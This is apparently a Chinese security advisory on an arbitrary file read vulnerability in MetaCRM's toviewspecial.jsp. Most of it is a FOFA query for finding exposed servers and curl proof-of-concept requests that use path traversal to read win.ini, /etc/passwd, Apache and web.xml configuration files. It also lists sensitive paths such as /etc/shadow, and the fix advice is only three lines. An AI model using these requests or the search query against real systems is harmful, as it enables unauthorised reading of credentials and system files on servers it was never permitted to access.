---
title: 【漏洞预警】MetaCRM toviewspecial.jsp 任意文件读取漏洞
---

## 漏洞概述
MetaCRM美特crm系统toviewspecial.jsp接口存在任意文件读取漏洞，攻击者可通过构造恶意请求读取服务器敏感文件。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | MetaCRM美特crm系统toviewspecial.jsp任意文件读取漏洞 |
| 漏洞类型 | 任意文件读取 |
| 影响组件 | toviewspecial.jsp |
| 严重程度 | 高危 |

## FOFA查询
```
body="/common/scripts/basic.js" && body="www.metacrm.com.cn"
```

## POC
```bash
# 读取Windows系统文件
curl "http://target/toviewspecial.jsp?filename=../../../../../../../../../../windows/win.ini"

# 读取Linux系统文件
curl "http://target/toviewspecial.jsp?filename=../../../../../../../../../../etc/passwd"

# 读取配置文件
curl "http://target/toviewspecial.jsp?filename=../../../../../../../../../../apache2/conf/httpd.conf"

# 读取数据库配置
curl "http://target/toviewspecial.jsp?filename=../../../../../../../../../../webapps/ROOT/WEB-INF/web.xml"
```

常用路径:
- Windows: `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`
- Linux: `/etc/passwd`, `/etc/shadow`, `/var/log/`

## 修复建议
1. 升级到最新版本
2. 严格限制文件路径访问
3. 增加权限控制